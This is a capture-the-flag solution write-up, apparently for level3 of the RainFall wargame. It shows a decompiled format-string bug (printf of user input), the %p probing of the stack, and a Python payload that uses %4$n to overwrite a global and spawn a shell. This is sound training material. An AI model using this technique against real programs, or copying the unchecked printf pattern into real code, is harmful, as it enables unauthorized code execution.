# Solution

```c
int m = 0;

int v()
{
  int result; // eax
  char v1[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(v1, 512, stdin);
  printf(v1);
  result = m;
  if ( m == 64 )
  {
    fwrite("Wait what?!\n", 1, 12, stdout);
    return system("/bin/sh");
  }
  return result;
}
```

exploit : Format string bug

```sh
level3@RainFall:~$ readelf -s level3 | grep m
    66: 0804988c     4 OBJECT  GLOBAL DEFAULT   25 m

level3@RainFall:~$ ./level3 
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```

our buffer is at the 4th address
we need m = 64 so we need to write 64 byte with printf and then write it to the address of m
payload : address of m (4) + padding (60) + %4$n (write 64 to 4th address (m))


```sh
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat -) | ./level3 
```

